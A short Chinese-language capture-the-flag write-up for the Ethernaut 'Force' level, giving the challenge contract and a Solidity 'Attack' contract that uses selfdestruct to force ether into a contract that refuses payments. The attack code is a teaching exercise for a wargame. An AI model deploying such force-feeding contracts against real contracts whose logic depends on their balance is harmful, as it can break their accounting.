# 07 - Force

## 题目

有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯

这一关的目标是使合约的余额大于0

```// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
   ```

## 解题
合约不接受 transfer 的资产，可以通过销毁合约的机制，将合约剩余的资金转移到这个题目合约上。
合约代码如下：

```

pragma solidity ^0.8.0;

contract Attack {
    function forceTransfer(address payable _addr) payable external {
        selfdestruct(_addr);
    }
}
```

